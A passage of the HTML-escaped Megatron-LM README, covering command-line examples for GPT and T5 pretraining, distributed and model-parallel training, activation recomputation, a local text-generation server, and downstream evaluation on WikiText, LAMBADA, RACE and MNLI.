4 \&#xA;          --global-batch-size 8 \&#xA;          --lr 0.00015 \&#xA;          --train-iters 500000 \&#xA;          --lr-decay-iters 320000 \&#xA;          --lr-decay-style cosine \&#xA;          --vocab-file $VOCAB_FILE \&#xA;          --merge-file $MERGE_FILE \&#xA;          --lr-warmup-fraction .01 \&#xA;          --fp16&#34;&#xA;&#xA;OUTPUT_ARGS=&amp;lt;same as those in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#bert-pretraining&#34;&gt;BERT pretraining&lt;/a&gt; above&amp;gt;&#xA;&#xA;python pretrain_gpt.py \&#xA;       $GPT_ARGS \&#xA;       $OUTPUT_ARGS \&#xA;       --save $CHECKPOINT_PATH \&#xA;       --load $CHECKPOINT_PATH \&#xA;       --data-path $DATA_PATH \&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;Further command line arguments are described in the source file &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/megatron/arguments.py&#34;&gt;&lt;code&gt;arguments.py&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;T5 Pretraining&lt;/h2&gt; &#xA;&lt;p&gt;Very similar to BERT and GPT, the &lt;code&gt;examples/pretrain_t5.sh&lt;/code&gt; script runs single GPU &#34;base&#34; (~220M parameter) T5 pretraining. The primary difference from BERT and GPT is the addition of the following arguments to accommodate the T5 architecture:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;--kv-channels&lt;/code&gt; sets the inner dimension of the &#34;key&#34; and &#34;value&#34; matrices of all attention mechanisms in the model. For BERT and GPT this defaults to the hidden size divided by the number of attention heads, but can be configured for T5.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;--ffn-hidden-size&lt;/code&gt; sets the hidden size in the feed-forward networks within a transformer layer. For BERT and GPT this defaults to 4 times the transformer hidden size, but can be configured for T5.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;--encoder-seq-length&lt;/code&gt; and &lt;code&gt;--decoder-seq-length&lt;/code&gt; set the sequence length for the encoder and decoder separately.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;All of the other arguments remain as they were for BERT and GPT pretraining.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;CHECKPOINT_PATH=checkpoints/t5_base&#xA;VOCAB_FILE=t5-vocab.txt&#xA;DATA_PATH=my-t5_text_sentence&#xA;&#xA;T5_ARGS=&#34;--num-layers 24 \&#xA;         --hidden-size 1024 \&#xA;         --num-attention-heads 16 \&#xA;         --kv-channels 64 \&#xA;         --ffn-hidden-size 3072 \&#xA;         --encoder-seq-length 512 \&#xA;         --decoder-seq-length 128 \&#xA;         --max-position-embeddings 512 \&#xA;         --lr 0.0001 \&#xA;         --lr-decay-iters 990000 \&#xA;         --train-iters 2000000 \&#xA;         --min-lr 0.00001 \&#xA;         --lr-warmup-fraction 0.01 \&#xA;         --micro-batch-size 16 \&#xA;         --global-batch-size 2048 \&#xA;         --vocab-file $VOCAB_FILE \&#xA;         --vocab-extra-ids 100 \&#xA;         --split 949,50,1 \&#xA;         --fp16&#34;&#xA;&#xA;OUTPUT_ARGS=&amp;lt;same as those in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#bert-pretraining&#34;&gt;BERT pretraining&lt;/a&gt; above&amp;gt;&#xA;&#xA;python pretrain_t5.py \&#xA;       $T5_ARGS \&#xA;       $OUTPUT_ARGS \&#xA;       --save $CHECKPOINT_PATH \&#xA;       --load $CHECKPOINT_PATH \&#xA;       --data-path $DATA_PATH&#xA;&lt;/pre&gt; &#xA;&lt;h2&gt;Distributed Pretraining&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;examples/pretrain_{bert,gpt,t5}_distributed.sh&lt;/code&gt; scripts use the PyTorch distributed launcher for distributed training. As such, multi-node training can be achieved by properly setting environment variables and using &lt;code&gt;init_method=&#39;env://&#39;&lt;/code&gt; in the launcher. See the official PyTorch &lt;a href=&#34;https://pytorch.org/docs/stable/distributed.html#launch-utility&#34;&gt;documentation&lt;/a&gt; for further description of these &lt;a href=&#34;https://pytorch.org/docs/stable/distributed.html#environment-variable-initialization&#34;&gt;environment variables&lt;/a&gt;. By default, multi-node training uses the &lt;a href=&#34;https://developer.nvidia.com/nccl&#34;&gt;nccl&lt;/a&gt; distributed backend. A simple set of additional arguments and the use of the PyTorch distributed module with the Python flag &lt;code&gt;-m torch.distributed.launch&lt;/code&gt;, detailed below, are the only additional requirements to adopt distributed training.&lt;/p&gt; &#xA;&lt;p&gt;We use two types of parallelism: data and model parallelism. We facilitate two distributed data parallel implementations: a simple one of our own that performs gradient all-reduce at the end of back propagation step, and Torch&#39;s distributed data parallel wrapper that overlaps gradient reduction with back propagation computation. To switch between these two options use &lt;code&gt;--DDP-impl local&lt;/code&gt; or &lt;code&gt;--DDP-impl torch&lt;/code&gt;, respectively. As expected, Torch distributed data parallelism is more efficient at larger model sizes. For example, for the 8.3 billion parameters model running on 512 GPUs, the scaling increases from 60% to 76% when Torch&#39;s distributed data parallel is used. However, the overlapping method requires more memory and for some configurations (e.g., 2.5 billion parameters using 2-way model parallel and 1.2 billion parameters with no model parallel) can make the overall training slower as a result. We empirically found that using a smaller model in those cases improves the training time.&lt;/p&gt; &#xA;&lt;p&gt;Second, we developed a simple and efficient two-dimensional model-parallel approach. To use tensor model parallelism (splitting execution of a single transformer module over multiple GPUs), add the &lt;code&gt;--tensor-model-parallel-size&lt;/code&gt; flag to specify the number of GPUs among which to split the model, along with the arguments passed to the distributed launcher as mentioned above. To use sequence parallelism specify &lt;code&gt;--sequence-parallel&lt;/code&gt;, which requires tensor model parallel as it split among the same GPUs.&lt;/p&gt; &#xA;&lt;p&gt;To use pipeline model parallelism (sharding the transformer modules into stages with an equal number of transformer modules on each stage, and then pipelining execution by breaking the batch into smaller microbatches), use the &lt;code&gt;--pipeline-model-parallel-size&lt;/code&gt; flag to specify the number of stages to split the model into (e.g., splitting a model with 24 transformer layers across 4 stages would mean each stage gets 6 transformer layers each).&lt;/p&gt; &#xA;&lt;!-- The number of microbatches in a per-pipeline minibatch is controlled by the `--num-microbatches-in-minibatch` argument. With `WORLD_SIZE` GPUs, `TENSOR_MP_SIZE` tensor-model-parallel size, `PIPELINE_MP_SIZE` pipeline-model-parallel-size, `WORLD_SIZE`/(`TENSOR_MP_SIZE` * `PIPELINE_MP_SIZE`) GPUs will be used for data parallelism. The default values for `--tensor-model-parallel-size` and `--pipeline-model-parallel-size` is 1, which will not implement either form of model parallelism. --&gt; &#xA;&lt;p&gt;We have examples of how to use these two different forms of model parallelism the example scripts ending in &lt;code&gt;distributed_with_mp.sh&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;p&gt;Other than these minor changes, the distributed training is identical to the training on a single GPU.&lt;/p&gt; &#xA;&lt;p&gt;Distributed training:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;WORLD_SIZE=8&#xA;TENSOR_MP_SIZE=2&#xA;PIPELINE_MP_SIZE=2&#xA;&#xA;DISTRIBUTED_ARGS=&#34;--nproc_per_node $WORLD_SIZE \&#xA;                  --nnodes 1 \&#xA;                  --node_rank 0 \&#xA;                  --master_addr localhost \&#xA;                  --master_port 6000&#34;&#xA;&#xA;CHECKPOINT_PATH=&amp;lt;same as above&amp;gt;&#xA;VOCAB_FILE=&amp;lt;same as above&amp;gt;&#xA;DATA_PATH=&amp;lt;same as above&amp;gt;&#xA;MODEL_ARGS=&amp;lt;same as above&amp;gt;&#xA;OUTPUT_ARGS=&amp;lt;same as above&amp;gt;&#xA;&#xA;python -m torch.distributed.launch $DISTRIBUTED_ARGS ./pretrain_&#xA; &lt;model&gt;&#xA;  .py \&#xA;                $MODEL_ARGS \&#xA;                $OUTPUT_ARGS \&#xA;                --save $CHECKPOINT_PATH \&#xA;                --load $CHECKPOINT_PATH \&#xA;                --data-path $DATA_PATH \&#xA;                --tensor-model-parallel-size $TENSOR_MP_SIZE \&#xA;                --pipeline-model-parallel-size $PIPELINE_MP_SIZE \&#xA;                --sequence-parallel \&#xA;                --DDP-impl torch&#xA;&#xA; &lt;/model&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The interleaved pipelining schedule (more details in Section 2.2.2 of &lt;a href=&#34;https://arxiv.org/pdf/2104.04473.pdf&#34;&gt;our paper&lt;/a&gt;) can be enabled using the &lt;code&gt;--num-layers-per-virtual-pipeline-stage&lt;/code&gt; argument, which controls the number of transformer layers in a virtual stage (by default with the non-interleaved schedule, each GPU will execute a single virtual stage with &lt;code&gt;NUM_LAYERS / PIPELINE_MP_SIZE&lt;/code&gt; transformer layers). The total number of layers in the transformer model should be divisible by this argument value. Additionally, the number of microbatches in the pipeline (computed as &lt;code&gt;GLOBAL_BATCH_SIZE / (DATA_PARALLEL_SIZE * MICRO_BATCH_SIZE)&lt;/code&gt;) should be divisible by the &lt;code&gt;PIPELINE_MP_SIZE&lt;/code&gt; when using this schedule (this condition is checked in an assertion in the code). The interleaved schedule is not supported for pipelines with 2 stages (&lt;code&gt;PIPELINE_MP_SIZE=2&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;h2&gt;Activation Checkpointing and Recomputation&lt;/h2&gt; &#xA;&lt;p&gt;To reduce GPU memory usage so deploy a large model to a training system, we support activation checkpointing and recomputation. We support two levels of recompute granularity: &lt;code&gt;selective&lt;/code&gt; and &lt;code&gt;full&lt;/code&gt;. Selective recomputation is the default and recommended in almost all cases. It saves the activations that take less space and are expensive to recompute and recomputes activations that take a lot of space but are relatively cheap to recompute (see &lt;a href=&#34;https://arxiv.org/pdf/2205.05198&#34;&gt;our paper&lt;/a&gt; for details). To enable selective activation recompute simply use &lt;code&gt;--recompute-activations&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For cases where memory is very tight, &lt;code&gt;full&lt;/code&gt; checkpointing saves just the inputs to a transformer layer, or a block of transformer layers, and recomputes everything else. To turn on full activation recompute use &lt;code&gt;--recompute-granularity full&lt;/code&gt;. When using full activation recomputation, there are two methods: &lt;code&gt;uniform&lt;/code&gt; and &lt;code&gt;block&lt;/code&gt;, chosen using the &lt;code&gt;--recompute-method&lt;/code&gt; argument.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Uniform method uniformly divides the Transformer layers into groups of layers and stores the input activations of each group in the memory. The baseline group size is 1 and, in this case, the input activation of each Transformer layer is checkpointed. When the GPU memory is insufficient, increasing the number of layers per group reduces the memory usage thus enables running a bigger model. For example, when using the number of layers per group of 4, the input activation of each group of 4 Transformer layers is checkpointed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Block method checkpoints the input activations of a set number of individual Transformer layers per pipeline stage and do the rest of layers without any checkpointing. This method can be used to skip checkpointing some Transformer layers until the GPU memory is fully used, which is applicable only when there is unused GPU memory. Checkpointing fewer transformer layers avoids unnecessary activation recomputation in the backprop thus improves training performance. For example, when we specify 5 layers to checkpoint of 8 layers per pipeline stage, the input activations of only the first 5 Transformer layers are checkpointed and activation recomputation for the rest 3 layers is not needed in the backprop.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;GPT-3 Example&lt;/h2&gt; &#xA;&lt;p&gt;In &lt;code&gt;examples/pretrain_gpt3_175B.sh&lt;/code&gt; we have provided an example of how to configure Megatron to run &lt;a href=&#34;https://arxiv.org/abs/2005.14165&#34;&gt;GPT-3&lt;/a&gt; with 175 billion parameters on 1024 GPUs. The script is designed for &lt;a href=&#34;https://slurm.schedmd.com/documentation.html&#34;&gt;slurm&lt;/a&gt; with &lt;a href=&#34;https://github.com/NVIDIA/pyxis&#34;&gt;pyxis&lt;/a&gt; plugin but can be easily adopted to any other scheduler. It uses 8-way and 16-way tensor and pipeline parallelism, respectively. With options &lt;code&gt;global-batch-size 1536&lt;/code&gt; and &lt;code&gt;rampup-batch-size 16 16 5859375&lt;/code&gt;, the training will start with global batch size 16 and linearly increase the global batch size to 1536 over 5,859,375 samples with incrmeental steps 16. The training dataset can be either a single set or a multiple datasets combined with a set of weights.&lt;/p&gt; &#xA;&lt;p&gt;With full global batch size of 1536 on 1024 A100 GPUs, each iteration takes around 32 seconds resulting in 138 teraFLOPs per GPU which is 44% of the theoretical peak FLOPs.&lt;/p&gt; &#xA;&lt;!--&#xA;## REALM Pipeline&#xA;We are working on implementing the [REALM](https://arxiv.org/pdf/2002.08909.pdf) system. The following sections (will) reflect the three stages of training it. For now it&#39;s just the ICT code.&#xA;Loosely, they are pretraining the retriever modules, then jointly training the language model and the retriever, and then finetuning a question answering head on the language model with fixed retriever.&#xA;&#xA;### Inverse Cloze Task (ICT) Pretraining&#xA;1. Have a corpus in loose JSON format with the intention of creating a collection of fixed-size blocks of text as the fundamental units of data. For a corpus like Wikipedia, this will mean multiple sentences per block but also multiple blocks per document.&#xA;Run `tools/preprocess_data.py` to construct one or more indexed datasets with the `--split-sentences` argument to make sentences the basic unit. For the original REALM system, we construct two datasets, one with the title of every document, and another with the body.&#xA;Refer to the following script&#xA;&lt;pre&gt;&#xA;python preprocess_data.py \&#xA;    --input /path/to/corpus.json \&#xA;    --json-keys text title \&#xA;    --split-sentences \&#xA;    --tokenizer-type BertWordPieceLowerCase \&#xA;    --vocab-file /path/to/vocab.txt \&#xA;    --output-prefix corpus_indexed \&#xA;    --workers 5  # works well for 10 CPU cores. Scale up accordingly.&#xA;&lt;/pre&gt;&#xA;&#xA;2. Use a custom samples mapping function in place of `megatron/data/realm_dataset_utils.get_block_samples_mapping` if required. To do this, you will need to implement a new function in C++ inside of `megatron/data/helpers.cpp`. The samples mapping data structure is used to select the data that will constitute every training sample in advance of the training loop.&#xA; The samples mapping is responsible for holding all of the required metadata needed to construct the sample from one or more indexed datasets. In REALM, the samples mapping contains the start and end sentence indices, as well as the document index (to find the correct title for a body) and a unique ID for every block.&#xA;3. Pretrain a BERT language model using `pretrain_bert.py`, with the sequence length equal to the block size in token ids. This model should be trained on the same indexed dataset that is used to supply the blocks for the information retrieval task.&#xA;In REALM, this is an uncased bert base model trained with the standard hyperparameters.&#xA;4. Use `pretrain_ict.py` to train an `ICTBertModel` which uses two BERT-based encoders to encode queries and blocks to perform retrieval with.&#xA;The script below trains the ICT model from REALM. It refrences a pretrained BERT model (step 3) in the `--bert-load` argument. The batch size used in the paper is 4096, so this would need to be run with data parallel world size 32.&#xA;&lt;pre&gt;&#xA;python pretrain_ict.py \&#xA;    --num-layers 12 \&#xA;    --num-attention-heads 12 \&#xA;    --hidden-size 768 \&#xA;    --batch-size 128 \&#xA;    --seq-length 256 \&#xA;    --max-position-embeddings 256 \&#xA;    --ict-head-size 128 \&#xA;    --train-iters 100000 \&#xA;    --activations-checkpoint-method uniform \&#xA;    --bert-load /path/to/pretrained_bert \&#xA;    --load checkpoints \&#xA;    --save checkpoints \&#xA;    --data-path /path/to/indexed_dataset \&#xA;    --titles-data-path /path/to/titles_indexed_dataset \&#xA;    --vocab-file /path/to/vocab.txt \&#xA;    --lr 0.0001 \&#xA;    --num-workers 2 \&#xA;    --lr-decay-style linear \&#xA;    --weight-decay 1e-2 \&#xA;    --clip-grad 1.0 \&#xA;    --lr-warmup-fraction .01 \&#xA;    --save-interval 3000 \&#xA;    --query-in-block-prob 0.1 \&#xA;    --fp16&#xA;&#xA;&lt;/pre&gt;&#xA;&#xA;### Building an Index of Block Embeddings&#xA;After having trained an ICT model, you can now embed an entire dataset of blocks by creating a `BlockData` structure. After that has been saved, you can load it&#xA;and wrap it with a `FaissMIPSIndex` to do fast similarity search which is key in the learned information retrieval pipeline. The initial index can be built with the following script, meant to be run in an interactive session. It can leverage multiple GPUs on multiple nodes to index large datasets much more quickly.&#xA;&#xA;&lt;pre&gt;&#xA;python tools/create_doc_index.py \&#xA;    --num-layers 12 \&#xA;    --hidden-size 768 \&#xA;    --ict-head-size 128 \&#xA;    --num-attention-heads 12 \&#xA;    --batch-size 128 \&#xA;    --activations-checkpoint-method uniform \&#xA;    --seq-length 256 \&#xA;    --max-position-embeddings 256 \&#xA;    --ict-load /path/to/pretrained_ict \&#xA;    --data-path /path/to/indexed_dataset \&#xA;    --titles-data-path /path/to/titles_indexed_dataset \&#xA;    --block-data-path embedded_blocks.pkl \&#xA;    --indexer-log-interval 1000 \&#xA;    --indexer-batch-size 128 \&#xA;    --vocab-file /path/to/vocab.txt \&#xA;    --num-workers 2 \&#xA;    --fp16&#xA;&lt;/pre&gt;&#xA;&#xA;--&gt; &#xA;&lt;h1&gt;Evaluation and Tasks&lt;/h1&gt; &#xA;&lt;p&gt;We provide several command line arguments, detailed in the scripts listed below, to handle various zero-shot and fine-tuned downstream tasks. However, you can also finetune your model from a pretrained checkpoint on other corpora as desired. To do so, simply add the &lt;code&gt;--finetune&lt;/code&gt; flag and adjust the input files and training parameters within the original training script. The iteration count will be reset to zero, and the optimizer and internal state will be reinitialized. If the fine-tuning is interrupted for any reason, be sure to remove the &lt;code&gt;--finetune&lt;/code&gt; flag before continuing, otherwise the training will start again from the beginning.&lt;/p&gt; &#xA;&lt;p&gt;Because evaluation requires substantially less memory than training, it may be advantageous to merge a model trained in parallel for use on a single GPU in downstream tasks. The following script accomplishes this. Currently only tensor model parallelism is supported on input and pipeline model parallelism on the output. This example reads in a model with 2-way tensor model parallelism and writes out a model with 2-way pipeline model parallelism.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;TENSOR_MODEL_PARALLEL_SIZE=2&#xA;TARGET_PIPELINE_MODEL_PARALLEL_SIZE=2&#xA;&#xA;VOCAB_FILE=bert-vocab.txt&#xA;CHECKPOINT_PATH=checkpoints/bert_345m&#xA;&#xA;WORLD_SIZE=$TENSOR_MODEL_PARALLEL_SIZE python tools/merge_mp_partitions.py \&#xA;        --model-type BERT \&#xA;        --tensor-model-parallel-size $TENSOR_MODEL_PARALLEL_SIZE \&#xA;        --pipeline-model-parallel-size 1 \&#xA;        --target-pipeline-model-parallel-size $TARGET_PIPELINE_MODEL_PARALLEL_SIZE \&#xA;        --tokenizer-type BertWordPieceLowerCase \&#xA;        --vocab-file $VOCAB_FILE \&#xA;        --num-layers 24 \&#xA;        --hidden-size 1024 \&#xA;        --num-attention-heads 16 \&#xA;        --seq-length 512 \&#xA;        --max-position-embeddings 512 \&#xA;        --load $CHECKPOINT_PATH&#xA;        --save $CHECKPOINT_PATH/merged&#xA;&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;Several downstream tasks are described for both GPT and BERT models below. They can be run in distributed and model parallel modes with the same changes used in the training scripts.&lt;/p&gt; &#xA;&lt;h2&gt;GPT Text Generation&lt;/h2&gt; &#xA;&lt;p&gt;We have included a simple REST server to use for text generation in &lt;code&gt;tools/run_text_generation_server.py&lt;/code&gt;. You run it much like you would start a pretraining job, specifying an appropriate pretrained checkpoint. There are also few optional parameters: &lt;code&gt;temperature&lt;/code&gt;, &lt;code&gt;top-k&lt;/code&gt;and &lt;code&gt;top-p&lt;/code&gt;. See &lt;code&gt;--help&lt;/code&gt; or the source file for more information. See &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/examples/run_text_generation_server_345M.sh&#34;&gt;examples/run_text_generation_server_345M.sh&lt;/a&gt; for an example of how to run the server.&lt;/p&gt; &#xA;&lt;p&gt;Once the server is running you can use &lt;code&gt;tools/text_generation_cli.py&lt;/code&gt; to query it, it takes one argument which is the host the server is running on.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;tools/text_generation_cli.py localhost&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;You can also use CURL or any other tools to query the server directly:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;curl &#39;http://localhost:5000/api&#39; -X &#39;PUT&#39; -H &#39;Content-Type: application/json; charset=UTF-8&#39;  -d &#39;{&#34;prompts&#34;:[&#34;Hello world&#34;], &#34;tokens_to_generate&#34;:1}&#39;&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/megatron/text_generation_server.py&#34;&gt;megatron/text_generation_server.py&lt;/a&gt; for more API options.&lt;/p&gt; &#xA;&lt;h2&gt;GPT Evaluation&lt;/h2&gt; &#xA;&lt;p&gt;We include example scripts for GPT evaluation on WikiText perplexity evaluation and LAMBADA Cloze accuracy.&lt;/p&gt; &#xA;&lt;h3&gt;WikiText Perplexity Evaluation&lt;/h3&gt; &#xA;&lt;p&gt;For even comparison with prior works, we evaluate perplexity on the word-level &lt;a href=&#34;https://s3.amazonaws.com/research.metamind.io/wikitext/wikitext-103-v1.zip&#34;&gt;WikiText-103 test dataset&lt;/a&gt;, and appropriately compute perplexity given the change in tokens when using our subword tokenizer.&lt;/p&gt; &#xA;&lt;p&gt;We use the following command to run WikiText-103 evaluation on a 345M parameter model.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;TASK=&#34;WIKITEXT103&#34;&#xA;&#xA;VALID_DATA=&amp;lt;wikitext path&amp;gt;.txt&#xA;VOCAB_FILE=gpt2-vocab.json&#xA;MERGE_FILE=gpt2-merges.txt&#xA;CHECKPOINT_PATH=checkpoints/gpt2_345m&#xA;&#xA;COMMON_TASK_ARGS=&#34;--num-layers 24 \&#xA;                  --hidden-size 1024 \&#xA;                  --num-attention-heads 16 \&#xA;                  --seq-length 1024 \&#xA;                  --max-position-embeddings 1024 \&#xA;                  --fp16 \&#xA;                  --vocab-file $VOCAB_FILE&#34;&#xA;&#xA;python tasks/main.py \&#xA;       --task $TASK \&#xA;       $COMMON_TASK_ARGS \&#xA;       --valid-data $VALID_DATA \&#xA;       --tokenizer-type GPT2BPETokenizer \&#xA;       --merge-file $MERGE_FILE \&#xA;       --load $CHECKPOINT_PATH \&#xA;       --micro-batch-size 8 \&#xA;       --activations-checkpoint-method uniform \&#xA;       --log-interval 10 \&#xA;       --no-load-optim \&#xA;       --no-load-rng&#xA;&lt;/pre&gt; &#xA;&lt;h3&gt;LAMBADA Cloze Accuracy&lt;/h3&gt; &#xA;&lt;p&gt;To compute LAMBADA cloze accuracy (the accuracy of predicting the last token given the preceding tokens) we utilize a detokenized, processed version of the &lt;a href=&#34;https://github.com/cybertronai/bflm/raw/master/lambada_test.jsonl&#34;&gt;LAMBADA dataset&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;We use the following command to run LAMBADA evaluation on a 345M parameter model. Note that the &lt;code&gt;--strict-lambada&lt;/code&gt; flag should be used to require whole word matching. Make that &lt;code&gt;lambada&lt;/code&gt; is part of the file path.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;TASK=&#34;LAMBADA&#34;&#xA;&#xA;VALID_DATA=&amp;lt;lambada path&amp;gt;.json&#xA;VOCAB_FILE=gpt2-vocab.json&#xA;MERGE_FILE=gpt2-merges.txt&#xA;CHECKPOINT_PATH=checkpoints/gpt2_345m&#xA;COMMON_TASK_ARGS=&amp;lt;same as those in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#wikitext-perplexity-evaluation&#34;&gt;WikiText Perplexity Evaluation&lt;/a&gt; above&amp;gt;&#xA;&#xA;python tasks/main.py \&#xA;       --task $TASK \&#xA;       $COMMON_TASK_ARGS \&#xA;       --valid-data $VALID_DATA \&#xA;       --tokenizer-type GPT2BPETokenizer \&#xA;       --strict-lambada \&#xA;       --merge-file $MERGE_FILE \&#xA;       --load $CHECKPOINT_PATH \&#xA;       --micro-batch-size 8 \&#xA;       --activations-checkpoint-method uniform \&#xA;       --log-interval 10 \&#xA;       --no-load-optim \&#xA;       --no-load-rng&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;Further command line arguments are described in the source file &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/tasks/main.py&#34;&gt;&lt;code&gt;main.py&lt;/code&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;BERT Task Evaluation&lt;/h2&gt; &#xA;&lt;h3&gt;RACE Evaluation&lt;/h3&gt; &#xA;&lt;p&gt;The following script finetunes the BERT model for evaluation on the &lt;a href=&#34;http://www.cs.cmu.edu/~glai1/data/race/&#34;&gt;RACE dataset&lt;/a&gt;. The &lt;code&gt;TRAIN_DATA&lt;/code&gt; and &lt;code&gt;VALID_DATA&lt;/code&gt; directory contain the RACE dataset as separate &lt;code&gt;.txt&lt;/code&gt; files. Note that for RACE, the batch size is the number of RACE query&#39;s to evaluate. Since each RACE query has four samples, the effective batch size passed through the model will be four times the batch size specified on the command line.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;TRAIN_DATA=&#34;data/RACE/train/middle&#34;&#xA;VALID_DATA=&#34;data/RACE/dev/middle \&#xA;            data/RACE/dev/high&#34;&#xA;VOCAB_FILE=bert-vocab.txt&#xA;PRETRAINED_CHECKPOINT=checkpoints/bert_345m&#xA;CHECKPOINT_PATH=checkpoints/bert_345m_race&#xA;COMMON_TASK_ARGS=&#34;--num-layers 24 \&#xA;                  --hidden-size 1024 \&#xA;                  --num-attention-heads 16 \&#xA;                  --seq-length 512 \&#xA;                  --max-position-embeddings 512 \&#xA;                  --fp16 \&#xA;                  --vocab-file $VOCAB_FILE&#34;&#xA;&#xA;COMMON_TASK_ARGS_EXT=&#34;--train-data $TRAIN_DATA \&#xA;                      --valid-data $VALID_DATA \&#xA;                      --pretrained-checkpoint $PRETRAINED_CHECKPOINT \&#xA;                      --activations-checkpoint-method uniform \&#xA;                      --save-interval 10000 \&#xA;                      --save $CHECKPOINT_PATH \&#xA;                      --log-interval 100 \&#xA;                      --eval-interval 1000 \&#xA;                      --eval-iters 10 \&#xA;                      --weight-decay 1.0e-1&#34;&#xA;&#xA;python tasks/main.py \&#xA;       --task RACE \&#xA;       $COMMON_TASK_ARGS \&#xA;       $COMMON_TASK_ARGS_EXT \&#xA;       --tokenizer-type BertWordPieceLowerCase \&#xA;       --epochs 3 \&#xA;       --micro-batch-size 4 \&#xA;       --lr 1.0e-5 \&#xA;       --lr-warmup-fraction 0.06&#xA;&lt;/pre&gt; &#xA;&lt;h3&gt;MNLI Evaluation&lt;/h3&gt; &#xA;&lt;p&gt;The following script finetunes the BERT model for evaluation with the &lt;a href=&#34;https://www.nyu.edu/projects/bowman/multinli/&#34;&gt;MultiNLI sentence pair corpus&lt;/a&gt;. Because the matching tasks are quite similar, the script can be quickly tweaked to work with the &lt;a href=&#34;https://www.kaggle.com/quora/question-pairs-dataset&#34;&gt;Quora Question Pairs&lt;/a&gt; (QQP) dataset as well.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;&#xA;TRAIN_DATA=&#34;data/glue_data/MNLI/train.tsv&#34;&#xA;VALID_DATA=&#34;data/glue_data/MNLI/dev_matched.tsv \&#xA;            data/glue_data/MNLI/dev_mismatched.tsv&#34;&#xA;PRETRAINED_CHECKPOINT=checkpoints/bert_345m&#xA;VOCAB_FILE=bert-vocab.txt&#xA;CHECKPOINT_PATH=checkpoints/bert_345m_mnli&#xA;COMMON_TASK_ARGS=&amp;lt;same as those in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#race-evaluation&#34;&gt;RACE Evaluation&lt;/a&gt; above&amp;gt;&#xA;COMMON_TASK_ARGS_EXT=&amp;lt;same as those in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#race-evaluation&#34;&gt;RACE Evaluation&lt;/a&gt; above&amp;gt;&#xA;&#xA;python tasks/main.py \&#xA;       --task MNLI \&#xA;       $COMMON_TASK_ARGS \&#xA;       $COMMON_TASK_ARGS_EXT \&#xA;       --tokenizer-type BertWordPieceLowerCase \&#xA;       --epochs 5 \&#xA;       --micro-batch-size 8 \&#xA;       --lr 5.0e-5 \&#xA;       --lr-warmup-fraction 0.065&#xA;&lt;/pre&gt; &#xA;&lt;h1&gt;Datasets&lt;/h1&gt; &#xA;&lt;p&gt;We do not host any datasets for GPT or BERT training, however, we detail their collection so that our results may be reproduced.&lt;/p&gt; &#xA;&lt;h2&gt;Collecting Wikipedia Training Data&lt;/h2&gt; &#xA;&lt;p&gt;We recommend following the Wikipedia data extraction process specified by Google research: &#34;the recommended pre-processing is to download &lt;a href=&#34;https://dumps.wikimedia.org/enwiki/latest/enwiki-latest-pages-articles.xml.bz2&#34;&gt;the latest dump&lt;/a&gt;, extract the text with &lt;a href=&#34;https://github.com/attardi/wikiextractor&#34;&gt;WikiExtractor.py&lt;/a&gt;, and then apply any necessary cleanup to convert it into plain text.&#34;&lt;/p&gt; &#xA;&lt;p&gt;We recommend using the &lt;code&gt;--json&lt;/code&gt; argument when using WikiExtractor, which will dump the Wikipedia data into loose json format (one json per line), making it more manageable on the file system and also readily consumable by our codebase. We recommend further preprocessing this json dataset by nltk punctuation standardization. For BERT training, use the &lt;code&gt;--split-sentences&lt;/code&gt; flag to &lt;code&gt;preprocess_data.py&lt;/code&gt; as described &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#data-preprocessing&#34;&gt;above&lt;/a&gt; to include sentence breaks in the produced index. If you&#39;d like to use Wikipedia data for GPT training you should still clean it with nltk/spacy/ftfy, but do not use the &lt;code&gt;--split-sentences&lt;/code&gt; flag.&lt;/p&gt; &#xA;&lt;h2&gt;Collecting GPT Webtext Data&lt;/h2&gt; &#xA;&lt;p&gt;We utilize the publicly available &lt;a href=&#34;https://github.com/eukaryote31/openwebtext&#34;&gt;OpenWebText&lt;/a&gt; library from &lt;a 